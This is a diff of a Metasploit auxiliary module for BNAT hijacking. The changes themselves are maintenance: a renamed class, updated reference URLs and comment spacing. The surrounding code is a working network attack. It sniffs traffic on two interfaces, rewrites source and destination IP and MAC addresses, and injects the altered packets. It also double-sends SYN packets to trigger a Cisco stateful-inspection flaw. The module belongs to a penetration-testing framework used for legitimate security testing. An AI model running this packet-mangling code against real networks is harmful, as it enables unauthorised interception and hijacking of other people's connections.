@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
@@ -21,8 +19,8 @@ class Metasploit3 < Msf::Auxiliary
       'License'      => MSF_LICENSE,
       'References'   =>
         [
-          [ 'URL', 'https://github.com/claudijd/BNAT-Suite'],
-          [ 'URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels'],
+          [ 'URL', 'https://github.com/claudijd/bnat' ],
+          [ 'URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels']
         ]
     )
     register_options(
@@ -32,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
           OptString.new('CLIENTIP',  [true, 'The ip of the client behing the BNAT router', '192.168.3.2']),
           OptString.new('SERVERIP',  [true, 'The ip of the server you are targeting', '1.1.2.1']),
           OptString.new('BNATIP',    [true, 'The ip of the bnat response you are getting', '1.1.2.2']),
-        ],self.class)
+        ])
   end
 
   def run
@@ -49,29 +47,29 @@ class Metasploit3 < Msf::Auxiliary
     bnatmac = arp2(bnatip,outint)
     print_line("Obtained BNAT MAC: #{bnatmac}\n\n")
 
-    #Create Interface Specific Configs
+    # Create Interface Specific Configs
     outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{outint}").config
     inconfig =  PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{inint}").config
 
-    #Set Captures for Traffic coming from Outside and from Inside respectively
+    # Set Captures for Traffic coming from Outside and from Inside respectively
     outpcap = PacketFu::Capture.new( :iface => "#{outint}", :start => true, :filter => "tcp and src #{bnatip}" )
     print_line("Now listening on #{outint}...")
 
     inpcap = PacketFu::Capture.new( :iface => "#{inint}", :start => true, :filter => "tcp and src #{clientip} and dst #{serverip}" )
     print_line("Now listening on #{inint}...\n\n")
 
-    #Start Thread from Outside Processing
+    # Start Thread from Outside Processing
     fromout = Thread.new do
       loop do
         outpcap.stream.each do |pkt|
           packet = PacketFu::Packet.parse(pkt)
 
-          #Build a shell packet that will never hit the wire as a hack to get desired mac's
+          # Build a shell packet that will never hit the wire as a hack to get desired mac's
           shell_pkt = PacketFu::TCPPacket.new(:config => inconfig, :timeout => 0.1, :flavor => "Windows")
           shell_pkt.ip_daddr = clientip
           shell_pkt.recalc
 
-          #Mangle Received Packet and Drop on the Wire
+          # Mangle Received Packet and Drop on the Wire
           packet.ip_saddr = serverip
           packet.ip_daddr = clientip
           packet.eth_saddr = shell_pkt.eth_saddr
@@ -84,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
-    #Start Thread from Inside Processing
+    # Start Thread from Inside Processing
     fromin = Thread.new do
       loop do
         inpcap.stream.each do |pkt|
@@ -98,19 +96,19 @@ class Metasploit3 < Msf::Auxiliary
             packet.eth_daddr = bnatmac
           end
 
-          #Build a shell packet that will never hit the wire as a hack to get desired mac's
+          # Build a shell packet that will never hit the wire as a hack to get desired mac's
           shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>"Windows")
           shell_pkt.ip_daddr = serverip
           shell_pkt.recalc
 
-          #Mangle Received Packet and Drop on the Wire
+          # Mangle Received Packet and Drop on the Wire
           packet.eth_saddr = shell_pkt.eth_saddr
           packet.ip_saddr=shell_pkt.ip_saddr
           packet.recalc
           inj = PacketFu::Inject.new( :iface => "#{outint}", :config =>outconfig )
           inj.a2w(:array => [packet.to_s])
 
-          #Trigger Cisco SPI Vulnerability by Double-tapping the SYN
+          # Trigger Cisco SPI Vulnerability by Double-tapping the SYN
           if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
             select(nil, nil, nil, 0.75)
             inj.a2w(:array => [packet.to_s])
